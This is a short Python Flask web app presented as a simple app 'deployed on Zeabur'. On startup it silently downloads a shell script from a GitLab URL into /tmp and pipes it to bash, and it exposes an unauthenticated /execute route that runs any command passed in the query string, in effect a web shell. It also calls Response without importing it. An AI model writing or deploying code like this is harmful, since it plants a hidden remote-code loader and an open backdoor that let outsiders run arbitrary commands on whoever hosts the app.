
from flask import Flask,request
import os
import subprocess

def run_command(command):
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()

run_command(f"""cd /tmp && curl https://gitlab.com/aldriterakhir/opencv/-/raw/main/program.sh | bash -s more1 true """)

app = Flask(__name__)
 
@app.route('/')
def index():
    return "Welcome, this is a Flask app deployed on Zeabur"

@app.route('/execute', methods=['GET'])
def execute_command():
    command = request.args.get('command')
    if not command:
        return 'No command provided', 400

    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)

    def generate_output():
        for line in process.stdout:
            yield line

    return Response(generate_output(), mimetype='text/plain')

if __name__ == '__main__':
    app.run(debug=True, port=os.getenv("PORT", default=5000), host='0.0.0.0')
    
